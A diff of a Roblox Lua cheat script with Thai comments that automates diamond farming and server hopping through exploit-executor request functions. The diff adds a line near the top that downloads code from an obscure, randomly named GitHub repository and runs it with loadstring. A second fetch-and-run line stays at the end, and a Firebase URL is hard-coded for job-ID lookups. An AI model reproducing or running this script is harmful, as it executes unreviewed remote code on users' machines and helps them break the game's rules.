@@ -113,10 +113,9 @@ while task.wait() do
         end
     end
 end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ajkd2e2141sdf121415643dfvbcw347584fgh3o/hmm/refs/heads/main/s3'))()
+_G.CONFIG = _G.CONFIG
 
-local url = "https://raw.githubusercontent.com/7878wqz/sc1/main/emoji"
-    local source = game:HttpGet(url)
-    loadstring(source)()
 -- 🔔 แสดงการแจ้งเตือน
 local function notify(title, message, duration)
     pcall(function()
@@ -130,27 +129,27 @@ end
 
 -- ⏰ ระบบ Timer อัตโนมัติ
 local function startAutoHopTimer()
-    --print("⏰ เริ่ม Auto Server Hop Timer (" .. TIMER_MINUTES .. " นาที)")
-    --notify("Auto Hop Started", "⏰ จะย้ายเซิร์ฟทุก " .. TIMER_MINUTES .. " นาที", 5)
+    print("⏰ เริ่ม Auto Server Hop Timer (" .. TIMER_MINUTES .. " นาที)")
+    notify("Auto Hop Started", "⏰ จะย้ายเซิร์ฟทุก " .. TIMER_MINUTES .. " นาที", 5)
     
     task.spawn(function()
         while true do
             task.wait(TIMER_SECONDS)
             
             if not isHopping then
-            --    print("⏰ ถึงเวลาย้ายเซิร์ฟแล้ว!")
+                print("⏰ ถึงเวลาย้ายเซิร์ฟแล้ว!")
                 AutoServerHop()
             else
-              --  print("⚠️ กำลังย้ายเซิร์ฟอยู่ ข้ามรอบนี้")
+                print("⚠️ กำลังย้ายเซิร์ฟอยู่ ข้ามรอบนี้")
             end
         end
     end)
 end
 
 -- 🚀 เริ่มระบบ
---print("🟢 Auto Server Hop System เริ่มแล้ว!")
---print("📍 Current JobId: " .. currentJobId)
---print("⏰ จะย้ายเซิร์ฟทุก " .. TIMER_MINUTES .. " นาที")
+print("🟢 Auto Server Hop System เริ่มแล้ว!")
+print("📍 Current JobId: " .. currentJobId)
+print("⏰ จะย้ายเซิร์ฟทุก " .. TIMER_MINUTES .. " นาที")
 startAutoHopTimer()
 
 
@@ -168,7 +167,13 @@ local function collectDiamonds()
             end)
             
             if success and _G.ShowLogs then
-               notify(_G.emoji.diamond .. "",diamondCount .. "!", 1)
+                print("✅ Collect Diamond Success! (" .. diamondCount .. ")\n✅ เก็บ Diamond สำเร็จ! (" .. diamondCount .. ")")
+                StarterGui:SetCore("SendNotification", {
+                    Icon = "rbxassetid://16129235054",
+                    Title = "แจ้งเตือน!",
+                    Text = "✅ Collect Diamond Success! (" .. diamondCount .. ")\n✅ เก็บ Diamond สำเร็จ! (" .. diamondCount .. ")",
+                    Duration = 5
+                })
             elseif not success and _G.ShowLogs then
                 warn("❌ Collect Diamond Failed: " .. tostring(err))
             end
@@ -178,7 +183,7 @@ local function collectDiamonds()
     end
     
     if diamondCount > 0 and _G.ShowLogs then
-        notify(_G.emoji.diamond .. "",diamondCount .. "!", 1)
+        print("💎 รวมเก็บ Diamond ได้: " .. diamondCount .. " อัน")
     end
     
     return diamondCount
@@ -245,12 +250,12 @@ local function checkAndCollectDiamondsBeforeHop()
     
     if diamondCount > 0 then
         if _G.ShowLogs then
-          --  warn("⚠️ ยังคงมี Diamond " .. diamondCount .. " อันเหลืออยู่")
+            warn("⚠️ ยังคงมี Diamond " .. diamondCount .. " อันเหลืออยู่")
         end
        
     else
         if _G.ShowLogs then
-          --  print("✅ ตรวจสอบแล้ว ไม่มี Diamond เหลือ")
+            print("✅ ตรวจสอบแล้ว ไม่มี Diamond เหลือ")
         end
       
     end
@@ -259,6 +264,9 @@ local function checkAndCollectDiamondsBeforeHop()
 end
 local startTime = tick()
 
+local CONFIG = {
+    FIREBASE_URL = "https://discordbotdata-29400-default-rtdb.asia-southeast1.firebasedatabase.app/jobids.json",
+}
 
 local Workspace = game:GetService("Workspace")
 local localPlayer = Players.LocalPlayer
@@ -270,13 +278,13 @@ print("🚀 Starting Server Hop Script...")
 local function getJobIDs()
     local ok, body = pcall(function()
         if request then
-            return request({Url = _G.CONFIG.FIREBASE_URL, Method = "GET"}).Body
+            return request({Url = CONFIG.FIREBASE_URL, Method = "GET"}).Body
         elseif syn and syn.request then
-            return syn.request({Url = _G.CONFIG.FIREBASE_URL, Method = "GET"}).Body
+            return syn.request({Url = CONFIG.FIREBASE_URL, Method = "GET"}).Body
         elseif http_request then
-            return http_request({Url = _G.CONFIG.FIREBASE_URL, Method = "GET"}).Body
+            return http_request({Url = CONFIG.FIREBASE_URL, Method = "GET"}).Body
         elseif http.request then
-            return http.request({Url = _G.CONFIG.FIREBASE_URL, Method = "GET"}).Body
+            return http.request({Url = CONFIG.FIREBASE_URL, Method = "GET"}).Body
         else
             error("no request function available")
         end
@@ -385,7 +393,7 @@ local hopMethodIndex = 1  -- ตัวแปรสำหรับติดตา
 
 local function antiFullServerHop()
     print("🛡️ เริ่มระบบย้ายเซิฟป้องกันเซิฟเต็ม Current JobId: " .. currentJobId)
-    notify("Anti-Full Hop", _G.emoji.shield .." กำลังค้นหาเซิฟที่ปลอดภัยที่สุด", 3)
+    notify("Anti-Full Hop", "🛡️ กำลังค้นหาเซิฟที่ปลอดภัยที่สุด", 3)
 
     -- เก็บ Diamond ก่อนย้าย
     local success = checkAndCollectDiamondsBeforeHop()
@@ -403,7 +411,7 @@ local function antiFullServerHop()
             joinLatestJobID()
         elseif hopMethodIndex == 2 then
            -- print("🔄 ใช้วิธีที่ 2: joinLatestJobID()")
-            AutoServerHop()
+            joinLatestJobID()
         elseif hopMethodIndex == 3 then
            -- print("🔄 ใช้วิธีที่ 3: Kick และ Teleport ไป PlaceId ใหม่")
             game.Players.LocalPlayer:Kick("KickForchangeserverwork\nเตะสำหรับทำให้ย้ายเซิฟทำงานได้")
@@ -446,9 +454,9 @@ end
 
 -- 🔄 ลูปหลักสำหรับตรวจสอบเวลา
 local function startAutoHopTimer()
-   --[[print("🚀 เริ่มระบบย้ายเซิร์ฟอัตโนมัติ Current JobId: " .. currentJobId)
+    print("🚀 เริ่มระบบย้ายเซิร์ฟอัตโนมัติ Current JobId: " .. currentJobId)
     print("⏱️ จะย้ายเซิร์ฟทุก " .. TIMER_MINUTES .. " นาที")
-    notify("Auto Hop Started", "⏱️ ย้ายเซิร์ฟทุก " .. TIMER_MINUTES .. " นาที", 5)]]
+    notify("Auto Hop Started", "⏱️ ย้ายเซิร์ฟทุก " .. TIMER_MINUTES .. " นาที", 5)
     
     spawn(function()
         while _G.AutoHopEnabled do
@@ -461,13 +469,13 @@ local function startAutoHopTimer()
             if remaining <= 10 and remaining > 0 then
                 print("⏰ " .. math.floor(remaining) .. " วินาที...")
                 if remaining <= 3 then
-                    notify("Countdown", "⏰ " .. math.floor(remaining) .. " S", 1)
+                    notify("Countdown", "⏰ " .. math.floor(remaining) .. " วินาที", 1)
                 end
             end
             
             if remaining <= 0 then
                 if not isHopping then
-                    --print("🎯 ถึงเวลาย้ายเซิร์ฟ!")
+                    print("🎯 ถึงเวลาย้ายเซิร์ฟ!")
                     AutoServerHop()
                     startTime = tick() -- รีเซ็ตเวลา
                 end
@@ -475,12 +483,12 @@ local function startAutoHopTimer()
                 task.wait()
                 
                 if game.JobId == currentJobId then
-                --    print("⚠️ ยังอยู่เซิร์ฟเดิม ลองใหม่ใน 5 วินาที... Current: " .. game.JobId)
-               --     notify("Retry", "⚠️ ลองใหม่ใน 5 วินาที", 3)
+                    print("⚠️ ยังอยู่เซิร์ฟเดิม ลองใหม่ใน 5 วินาที... Current: " .. game.JobId)
+                    notify("Retry", "⚠️ ลองใหม่ใน 5 วินาที", 3)
                     isHopping = false
                     task.wait()
                 else
-                 --   print("✅ ย้ายสำเร็จ! JobId ใหม่: " .. game.JobId)
+                    print("✅ ย้ายสำเร็จ! JobId ใหม่: " .. game.JobId)
                     currentJobId = game.JobId -- อัพเดท (แม้จะอัตโนมัติ แต่ยืนยัน)
                     startTime = tick()
                 end
@@ -493,19 +501,19 @@ end
 
 -- 🎮 ฟังก์ชันเริ่มต้นระบบ
 local function initAutoHop()
- --[[print("📋 กำลังเริ่มระบบ Auto Server Hop Current JobId: " .. currentJobId)
+    print("📋 กำลังเริ่มระบบ Auto Server Hop Current JobId: " .. currentJobId)
     print("📍 เซิร์ฟปัจจุบัน: " .. currentJobId)
     print("🎯 PlaceID: " .. PlaceID)
     notify("Notify", "PlaceID: " .. PlaceID, 3)
-    notify("Notify", "Current: " .. currentJobId, 3)]]
+    notify("Notify", "Current: " .. currentJobId, 3)
     
     startAutoHopTimer()
 end
 
 -- 🛑 ฟังก์ชันหยุดระบบ
 local function stopAutoHop()
-  --[[ print("🛑 หยุดระบบ Auto Server Hop")
-    notify("Stopped", "🛑 หยุดระบบ Auto Hop", 3)]]
+    print("🛑 หยุดระบบ Auto Server Hop")
+    notify("Stopped", "🛑 หยุดระบบ Auto Hop", 3)
     _G.AutoHopEnabled = false
 end
 
@@ -541,7 +549,7 @@ if game.PlaceId == 79546208627805 then
         Text = "Lobby",
         Duration = 3
     })
-notify("Lobby Detected", "Auto Joining Ingame...", 3)
+
     spawn(function()
         while task.wait() do 
             if _G.FarmChest then 
@@ -594,7 +602,7 @@ elseif game.PlaceId == 126509999114328 then
         Text = "Ingame",
         Duration = 3
     })
-     notify("Script Loaded", _G.emoji.greenCircle .. " Active", 20)
+    
     -- ฟาร์มเพชร
     _G.FarmChest = _G.FarmChest or true
     _G.FastMode = _G.FastMode or true
@@ -799,7 +807,7 @@ coroutine.wrap(VFHJNK_fake_script)()
             local startTime = tick()
             
             if _G.ShowLogs then
-              --  print(" เริ่มรอบที่ " .. cycleCount .. "/" .. _G.MaxCycles)
+                print(" เริ่มรอบที่ " .. cycleCount .. "/" .. _G.MaxCycles)
             end
            
             
@@ -814,13 +822,13 @@ coroutine.wrap(VFHJNK_fake_script)()
             local cycleTime = math.floor((endTime - startTime) * 100) / 100
             
             if _G.ShowLogs then
-           --     print("⏱️ รอบที่ " .. cycleCount .. " เสร็จใน " .. cycleTime .. " วินาที")
+                print("⏱️ รอบที่ " .. cycleCount .. " เสร็จใน " .. cycleTime .. " วินาที")
             end
             
             -- ตรวจสอบว่าครบจำนวนรอบสูงสุดหรือยัง
             if cycleCount >= _G.MaxCycles then
                 if _G.ShowLogs then
-              --      print("🔄 ครบ " .. _G.MaxCycles .. " รอบแล้ว ตรวจสอบ Diamond ก่อนย้ายเซิฟ")
+                    print("🔄 ครบ " .. _G.MaxCycles .. " รอบแล้ว ตรวจสอบ Diamond ก่อนย้ายเซิฟ")
                 end
              
                 antiFullServerHop() -- ใช้ antiFullServerHop แทน serverHop
@@ -838,15 +846,15 @@ coroutine.wrap(VFHJNK_fake_script)()
         end
         
         if _G.ShowLogs then
-           -- print("🛑 หยุดฟาร์มแล้ว (รวม " .. cycleCount .. " รอบ)")
-           
+            print("🛑 หยุดฟาร์มแล้ว (รวม " .. cycleCount .. " รอบ)")
+           antiFullServerHop()
         end
     end
 
     -- ฟังก์ชันรันครั้งเดียว (จากโค้ดต้นฉบับ)
     local function runOnce()
         if _G.ShowLogs then
-       --     print("🎯 เปิดกล่องและเก็บ Diamond ครั้งเดียว")
+            print("🎯 เปิดกล่องและเก็บ Diamond ครั้งเดียว")
         end
         openAllChestsAndCollect()
     end
@@ -944,7 +952,7 @@ coroutine.wrap(VFHJNK_fake_script)()
         end
         
         if _G.ShowLogs then
-         --   print("📊 พบกล่อง: " .. chestCount .. " | เปิดได้: " .. successCount .. " | เปิดแล้ว: " .. alreadyOpenedCount)
+            print("📊 พบกล่อง: " .. chestCount .. " | เปิดได้: " .. successCount .. " | เปิดแล้ว: " .. alreadyOpenedCount)
           
         end
         
@@ -979,7 +987,7 @@ coroutine.wrap(VFHJNK_fake_script)()
     -- ฟังก์ชันรันครั้งเดียว (จากโค้ดต้นฉบับ)
     local function runOnce()
         if _G.ShowLogs then
-        --    print("🎯 เปิดกล่องและเก็บ Diamond ครั้งเดียว")
+            print("🎯 เปิดกล่องและเก็บ Diamond ครั้งเดียว")
         end
         openAllChestsAndCollect()
     end
@@ -1005,431 +1013,5 @@ spawn(function()
         end
     end
 end)
-    local lp = Players.LocalPlayer
-    while not lp do
-        Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
-        lp = Players.LocalPlayer
-    end
-    while not Players.LocalPlayer or not Players.LocalPlayer:FindFirstChild("PlayerGui") do
-        task.wait()
-    end
-
-    local TweenService = game:GetService("TweenService")
-    local UserInputService = game:GetService("UserInputService")
-    local playerGui = player:WaitForChild("PlayerGui")
-
-    -- Remove existing UI
-    if playerGui:FindFirstChild("ModernPlayerUI") then
-        playerGui.ModernPlayerUI:Destroy()
-    end
-
-    -- Create ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "ModernPlayerUI"
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = playerGui
-
-    -- Main Frame (adjusted size to fit smaller cards)
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Name = "MainFrame"
-    mainFrame.Size = UDim2.new(0, 400, 0, 300) -- Reduced from 800x500
-    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
-    mainFrame.BackgroundTransparency = 1
-    mainFrame.Parent = screenGui
-
-    -- Background with gradient
-    local background = Instance.new("Frame")
-    background.Name = "Background"
-    background.Size = UDim2.new(1, 0, 1, 0)
-    background.Position = UDim2.new(0, 0, 0, 0)
-    background.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
-    background.BorderSizePixel = 0
-    background.Parent = mainFrame
-
-    local bgGradient = Instance.new("UIGradient")
-    bgGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 30, 45)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 20, 30))
-    }
-    bgGradient.Rotation = 45
-    bgGradient.Parent = background
-
-    local bgCorner = Instance.new("UICorner")
-    bgCorner.CornerRadius = UDim.new(0, 20)
-    bgCorner.Parent = background
-
-    -- Glow effect
-    local glowFrame = Instance.new("Frame")
-    glowFrame.Name = "GlowFrame"
-    glowFrame.Size = UDim2.new(1, 10, 1, 10)
-    glowFrame.Position = UDim2.new(0, -5, 0, -5)
-    glowFrame.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
-    glowFrame.BackgroundTransparency = 0.8
-    glowFrame.BorderSizePixel = 0
-    glowFrame.ZIndex = -1
-    glowFrame.Parent = mainFrame
-
-    local glowCorner = Instance.new("UICorner")
-    glowCorner.CornerRadius = UDim.new(0, 25)
-    glowCorner.Parent = glowFrame
-
-    -- Header Section
-    local headerFrame = Instance.new("Frame")
-    headerFrame.Name = "HeaderFrame"
-    headerFrame.Size = UDim2.new(1, -40, 0, 80)
-    headerFrame.Position = UDim2.new(0, 20, 0, 20)
-    headerFrame.BackgroundTransparency = 1
-    headerFrame.Parent = mainFrame
-
-    -- Logo/Brand
-    local logoFrame = Instance.new("Frame")
-    logoFrame.Name = "LogoFrame"
-    logoFrame.Size = UDim2.new(0, 50, 0, 50)
-    logoFrame.Position = UDim2.new(0, 0, 0, 15)
-    logoFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-    logoFrame.BorderSizePixel = 0
-    logoFrame.Parent = headerFrame
-
-    local logoCorner = Instance.new("UICorner")
-    logoCorner.CornerRadius = UDim.new(0, 30)
-    logoCorner.Parent = logoFrame
-
-    local logoGradient = Instance.new("UIGradient")
-    logoGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 165, 0))
-    }
-    logoGradient.Rotation = 45
-    logoGradient.Parent = logoFrame
-
-    local logoText = Instance.new("TextLabel")
-    logoText.Size = UDim2.new(1, 0, 1, 0)
-    logoText.BackgroundTransparency = 1
-    logoText.Text = "!"
-    logoText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    logoText.TextScaled = true
-    logoText.Font = Enum.Font.SourceSansBold
-    logoText.Parent = logoFrame
-
-    -- Facebook info
-    local facebookFrame = Instance.new("Frame")
-    facebookFrame.Name = "FacebookFrame"
-    facebookFrame.Size = UDim2.new(0, 250, 0, 40) -- Reduced from 260x40
-    facebookFrame.Position = UDim2.new(0, 70, 0, 20)
-    facebookFrame.BackgroundColor3 = Color3.fromRGB(6, 54, 255)
-    facebookFrame.BorderSizePixel = 0
-    facebookFrame.Parent = headerFrame
-
-    local fbCorner = Instance.new("UICorner")
-    fbCorner.CornerRadius = UDim.new(0, 8)
-    fbCorner.Parent = facebookFrame
-
-    local facebookText = Instance.new("TextLabel")
-    facebookText.Size = UDim2.new(1, -10, 1, 0)
-    facebookText.Position = UDim2.new(0, 5, 0, 0)
-    facebookText.BackgroundTransparency = 1
-    facebookText.Text = "Created by Vector Hub Script Free"
-    facebookText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    facebookText.TextScaled = true
-    facebookText.Font = Enum.Font.SourceSans
-    facebookText.TextXAlignment = Enum.TextXAlignment.Left
-    facebookText.Parent = facebookFrame
-
-    -- Content Section
-    local contentFrame = Instance.new("Frame")
-    contentFrame.Name = "ContentFrame"
-    contentFrame.Size = UDim2.new(1, -40, 0, 150) -- Reduced height from 300
-    contentFrame.Position = UDim2.new(0, 20, 0, 120)
-    contentFrame.BackgroundTransparency = 1
-    contentFrame.Parent = mainFrame
-
-    -- Player Info Card
-    local playerCard = Instance.new("Frame")
-    playerCard.Name = "PlayerCard"
-    playerCard.Size = UDim2.new(0, 175, 0, 125) -- Reduced from 350x250
-    playerCard.Position = UDim2.new(0, 0, 0, 0)
-    playerCard.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
-    playerCard.BorderSizePixel = 0
-    playerCard.Parent = contentFrame
-
-    local playerCardCorner = Instance.new("UICorner")
-    playerCardCorner.CornerRadius = UDim.new(0, 15)
-    playerCardCorner.Parent = playerCard
-
-    local playerGradient = Instance.new("UIGradient")
-    playerGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 40, 55)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 30, 45))
-    }
-    playerGradient.Rotation = 135
-    playerGradient.Parent = playerCard
-
-    -- Player card glow
-    local playerGlow = Instance.new("Frame")
-    playerGlow.Name = "PlayerGlow"
-    playerGlow.Size = UDim2.new(1, 6, 1, 6)
-    playerGlow.Position = UDim2.new(0, -3, 0, -3)
-    playerGlow.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
-    playerGlow.BackgroundTransparency = 0.7
-    playerGlow.BorderSizePixel = 0
-    playerGlow.ZIndex = -1
-    playerGlow.Parent = playerCard
-
-    local playerGlowCorner = Instance.new("UICorner")
-    playerGlowCorner.CornerRadius = UDim.new(0, 18)
-    playerGlowCorner.Parent = playerGlow
-
-    -- Player header
-    local playerHeader = Instance.new("TextLabel")
-    playerHeader.Name = "PlayerHeader"
-    playerHeader.Size = UDim2.new(1, -10, 0, 20) -- Reduced from 40
-    playerHeader.Position = UDim2.new(0, 5, 0, 5)
-    playerHeader.BackgroundTransparency = 1
-    playerHeader.Text = "Username"
-    playerHeader.TextColor3 = Color3.fromRGB(180, 190, 210)
-    playerHeader.TextScaled = true
-    playerHeader.Font = Enum.Font.SourceSans
-    playerHeader.Parent = playerCard
-
-    -- Player avatar frame
-    local avatarFrame = Instance.new("ImageLabel")
-    avatarFrame.Name = "AvatarFrame"
-    avatarFrame.Size = UDim2.new(0, 45, 0, 45) -- Reduced from 90x90
-    avatarFrame.Position = UDim2.new(0, 4, 0, 40)
-    avatarFrame.BackgroundColor3 = Color3.fromRGB(50, 70, 120)
-    avatarFrame.BorderSizePixel = 0
-    avatarFrame.ScaleType = Enum.ScaleType.Crop
-    avatarFrame.Parent = playerCard
-
-    local userId = player.UserId
-    avatarFrame.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
-
-    local avatarCorner = Instance.new("UICorner")
-    avatarCorner.CornerRadius = UDim.new(0, 20) -- Adjusted for smaller size
-    avatarCorner.Parent = avatarFrame
-
-    local avatarStroke = Instance.new("UIStroke")
-    avatarStroke.Color = Color3.fromRGB(24, 24, 24)
-    avatarStroke.Thickness = 2 -- Reduced from 3
-    avatarStroke.Parent = avatarFrame
-
-    -- Player name
-    local playerNameFrame = Instance.new("Frame")
-    playerNameFrame.Name = "PlayerNameFrame"
-    playerNameFrame.Size = UDim2.new(0, 110, 0, 40) -- Reduced from 220x80
-    playerNameFrame.Position = UDim2.new(0, 55, 0, 40)
-    playerNameFrame.BackgroundTransparency = 1
-    playerNameFrame.Parent = playerCard
-
-    local playerName = Instance.new("TextLabel")
-    playerName.Name = "PlayerName"
-    playerName.Size = UDim2.new(1, 0, 1, 0)
-    playerName.BackgroundTransparency = 1
-    playerName.Text = game.Players.LocalPlayer.Name
-    playerName.TextColor3 = Color3.fromRGB(255, 255, 255)
-    playerName.TextScaled = true
-    playerName.Font = Enum.Font.SourceSansBold
-    playerName.TextXAlignment = Enum.TextXAlignment.Left
-    playerName.Parent = playerNameFrame
-
-    -- Diamond Card
-    local diamondCard = Instance.new("Frame")
-    diamondCard.Name = "DiamondCard"
-    diamondCard.Size = UDim2.new(0, 175, 0, 125) -- Reduced from 350x250
-    diamondCard.Position = UDim2.new(0, 185, 0, 0) -- Adjusted for new width
-    diamondCard.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
-    diamondCard.BorderSizePixel = 0
-    diamondCard.Parent = contentFrame
-
-    local diamondCardCorner = Instance.new("UICorner")
-    diamondCardCorner.CornerRadius = UDim.new(0, 15)
-    diamondCardCorner.Parent = diamondCard
-
-    local diamondGradient = Instance.new("UIGradient")
-    diamondGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 40, 55)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 30, 45))
-    }
-    diamondGradient.Rotation = 45
-    diamondGradient.Parent = diamondCard
-
-    -- Diamond card glow
-    local diamondGlow = Instance.new("Frame")
-    diamondGlow.Name = "DiamondGlow"
-    diamondGlow.Size = UDim2.new(1, 6, 1, 6)
-    diamondGlow.Position = UDim2.new(0, -3, 0, -3)
-    diamondGlow.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
-    diamondGlow.BackgroundTransparency = 0.7
-    diamondGlow.BorderSizePixel = 0
-    diamondGlow.ZIndex = -1
-    diamondGlow.Parent = diamondCard
-
-    local diamondGlowCorner = Instance.new("UICorner")
-    diamondGlowCorner.CornerRadius = UDim.new(0, 18)
-    diamondGlowCorner.Parent = diamondGlow
-
-    -- Diamond header
-    local diamondHeader = Instance.new("TextLabel")
-    diamondHeader.Name = "DiamondHeader"
-    diamondHeader.Size = UDim2.new(1, -10, 0, 20) -- Reduced from 40
-    diamondHeader.Position = UDim2.new(0, 5, 0, 5)
-    diamondHeader.BackgroundTransparency = 1
-    diamondHeader.Text = "Diamond"
-    diamondHeader.TextColor3 = Color3.fromRGB(180, 190, 210)
-    diamondHeader.TextScaled = true
-    diamondHeader.Font = Enum.Font.SourceSans
-    diamondHeader.Parent = diamondCard
-
-    -- Diamond icon
-    local diamondIcon = Instance.new("Frame")
-    diamondIcon.Name = "DiamondIcon"
-    diamondIcon.Size = UDim2.new(0, 45, 0, 45) -- Reduced from 90x90
-    diamondIcon.Position = UDim2.new(0, 15, 0, 40)
-    diamondIcon.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
-    diamondIcon.BorderSizePixel = 0
-    diamondIcon.Parent = diamondCard
-
-    local diamondIconCorner = Instance.new("UICorner")
-    diamondIconCorner.CornerRadius = UDim.new(0, 15)
-    diamondIconCorner.Parent = diamondIcon
-
-    local diamondIconGradient = Instance.new("UIGradient")
-    diamondIconGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 220, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 150, 255))
-    }
-    diamondIconGradient.Rotation = 45
-    diamondIconGradient.Parent = diamondIcon
-
-    local diamondSymbol = Instance.new("TextLabel")
-    diamondSymbol.Size = UDim2.new(1, 0, 1, 0)
-    diamondSymbol.BackgroundTransparency = 1
-    diamondSymbol.Text = _G.emoji.diamond .. ""
-    diamondSymbol.TextColor3 = Color3.fromRGB(255, 255, 255)
-    diamondSymbol.TextScaled = true
-    diamondSymbol.Font = Enum.Font.SourceSansBold
-    diamondSymbol.Parent = diamondIcon
-
-    -- Diamond amount
-    local diamondAmount = Instance.new("TextLabel")
-    diamondAmount.Name = "DiamondAmount"
-    diamondAmount.Size = UDim2.new(0, 90, 0, 50) -- Reduced from 180x100
-    diamondAmount.Position = UDim2.new(0, 70, 0, 40)
-    diamondAmount.BackgroundTransparency = 1
-    diamondAmount.TextColor3 = Color3.fromRGB(255, 255, 255)
-    diamondAmount.TextScaled = true
-    diamondAmount.Font = Enum.Font.SourceSansBold
-    diamondAmount.TextXAlignment = Enum.TextXAlignment.Left
-    diamondAmount.Parent = diamondCard
-
-    -- Update diamond amount
-    local pg = lp:WaitForChild("PlayerGui")
-    local interface = pg:WaitForChild("Interface", 10)
-    local diamondCount = interface and interface:WaitForChild("DiamondCount", 10)
-    local countLabel = diamondCount and diamondCount:WaitForChild("Count", 10)
-    if countLabel then
-        diamondAmount.Text = "Diamond: " .. countLabel.Text
-        countLabel:GetPropertyChangedSignal("Text"):Connect(function()
-            diamondAmount.Text = "Diamond: " .. countLabel.Text
-        end)
-    else
-        diamondAmount.Text = "Diamond: Loading..."
-    end
-
-    -- Bottom Section
-    local bottomFrame = Instance.new("Frame")
-    bottomFrame.Name = "BottomFrame"
-    bottomFrame.Size = UDim2.new(1, -40, 0, 30) -- Reduced from 60
-    bottomFrame.Position = UDim2.new(0, 20, 0, 260) -- Adjusted for new mainFrame height
-    bottomFrame.BackgroundTransparency = 1
-    bottomFrame.Parent = mainFrame
-
-    -- Time Card
-    local timeCard = Instance.new("Frame")
-    timeCard.Name = "TimeCard"
-    timeCard.Size = UDim2.new(0, 150, 0, 25) -- Reduced from 300x50
-    timeCard.Position = UDim2.new(0.5, -75, 0, 2)
-    timeCard.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
-    timeCard.BorderSizePixel = 0
-    timeCard.Parent = bottomFrame
-
-    local timeCardCorner = Instance.new("UICorner")
-    timeCardCorner.CornerRadius = UDim.new(0, 12)
-    timeCardCorner.Parent = timeCard
-
-    local timeCardGradient = Instance.new("UIGradient")
-    timeCardGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 165, 0))
-    }
-    timeCardGradient.Rotation = 45
-    timeCardGradient.Parent = timeCard
-
-    local timeText = Instance.new("TextLabel")
-    timeText.Name = "TimeText"
-    timeText.Size = UDim2.new(1, -10, 1, 0)
-    timeText.Position = UDim2.new(0, 5, 0, 0)
-    timeText.BackgroundTransparency = 1
-    timeText.Text = _G.emoji.hourglass .. "Loading.." 
-    timeText.TextSize = 10 -- Reduced from 20
-    timeText.TextColor3 = Color3.fromRGB(0, 0, 0)
-    timeText.TextScaled = false
-    timeText.Font = Enum.Font.SourceSansBold
-    timeText.Parent = timeCard
-
-    local function UpdateTime()
-        local GameTime = math.floor(workspace.DistributedGameTime + 0.5)
-        local Hour = math.floor(GameTime / 3600) % 24
-        local Minute = math.floor(GameTime / 60) % 60
-        local Second = GameTime % 60
-        timeText.Text = (_G.emoji.hourglass .. "Hour : %02d Minute : %02d Second : %02d"):format(Hour, Minute, Second)
-    end
-
-    task.spawn(function()
-        while task.wait(1) do
-            pcall(UpdateTime)
-        end
-    end)
-
-    -- Animations
-    local function createPulseAnimation(object, color)
-        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
-        local tween = TweenService:Create(object, tweenInfo, {BackgroundTransparency = 0.9})
-        tween:Play()
-    end
-
-    createPulseAnimation(playerGlow, Color3.fromRGB(255, 100, 100))
-    createPulseAnimation(diamondGlow, Color3.fromRGB(100, 200, 255))
-
-    -- Entrance animation
-    local entranceTweenInfo = TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-    mainFrame.Size = UDim2.new(0, 0, 0, 0)
-    local entranceTween = TweenService:Create(mainFrame, entranceTweenInfo, {Size = UDim2.new(0, 400, 0, 300)})
-    entranceTween:Play()
-
-    -- Close button
-    local closeButton = Instance.new("TextButton")
-    closeButton.Name = "CloseButton"
-    closeButton.Size = UDim2.new(0, 20, 0, 20) -- Reduced from 40x40
-    closeButton.Position = UDim2.new(1, -30, 0, 10)
-    closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-    closeButton.BorderSizePixel = 0
-    closeButton.Text = "X"
-    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeButton.TextScaled = true
-    closeButton.Font = Enum.Font.SourceSansBold
-    closeButton.Parent = mainFrame
-
-    local closeCorner = Instance.new("UICorner")
-    closeCorner.CornerRadius = UDim.new(0, 10)
-    closeCorner.Parent = closeButton
-
-    closeButton.MouseButton1Click:Connect(function()
-        local closeTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)})
-        closeTween:Play()
-        closeTween.Completed:Connect(function()
-            screenGui:Destroy()
-        end)
-    end)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/7878wqz/sc1/refs/heads/main/h'))()
 --ปัจจุบันใช้ตัวนี้
